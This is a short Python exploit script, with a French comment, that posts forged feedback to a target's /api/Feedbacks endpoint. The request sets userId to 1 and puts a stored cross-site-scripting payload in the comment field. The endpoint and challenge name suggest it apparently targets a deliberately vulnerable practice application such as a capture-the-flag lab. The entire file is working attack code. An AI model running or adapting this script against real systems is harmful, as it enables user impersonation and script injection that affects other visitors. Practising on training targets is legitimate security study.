import requests

class ForgedFeedback:
    def __init__(self, target_url: str):
        self.target_url = target_url

    def run_exploit(self):
        print(f"[+] Running Forged Feedback on {self.target_url}")

        # Endpoint pour soumettre un feedback
        endpoint = f"{self.target_url}/api/Feedbacks"
        data = {
            "comment": "<script>alert('Hacked!')</script>",
            "rating": 5,
            "userId": 1
        }

        try:
            response = requests.post(endpoint, json=data)
            if response.status_code == 201:
                print("[+] Feedback successfully submitted!")
                print(response.json())
            else:
                print(f"[-] Failed to submit feedback: {response.status_code}")
        except Exception as e:
            print(f"[!] Error during Forged Feedback: {e}")